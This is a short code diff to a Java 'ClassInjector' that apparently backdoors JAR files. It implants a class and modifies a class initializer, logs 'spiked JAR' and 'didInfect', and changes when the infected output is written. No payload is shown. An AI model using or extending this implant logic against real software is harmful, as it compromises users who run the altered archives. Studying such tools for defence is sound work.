@@ -5,9 +5,7 @@ import javassist.bytecode.*;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
-import java.nio.file.Files;
 import java.nio.file.Path;
-import java.nio.file.StandardCopyOption;
 import java.util.jar.JarEntry;
 import java.util.zip.ZipException;
 
@@ -26,8 +24,6 @@ public class ClassInjector {
 
         if (jarLooksSigned(targetJarFilePath)) {
             System.out.println("[-] JAR looks signed. This is not yet implemented. Aborting.");
-            // Just copy the input JAR to the output JAR to keep up with expected behaviour
-            Files.copy(targetJarFilePath, outputJar, StandardCopyOption.REPLACE_EXISTING);
             return false;
         }
 
@@ -77,9 +73,15 @@ public class ClassInjector {
                 System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
             }
 
-            fiddler.write(outputJar);
+            boolean didInfect = implantedClass != null;
+            if (didInfect) {
+                fiddler.write(outputJar);
+                System.out.println("[+] Wrote spiked JAR to " + outputJar);
+            } else {
+                System.out.println("[-] Did not write to any JAR.");
+            }
 
-            return implantedClass != null;
+            return didInfect;
         } catch (Exception e) {
             throw new IOException("Something went wrong", e);
         }
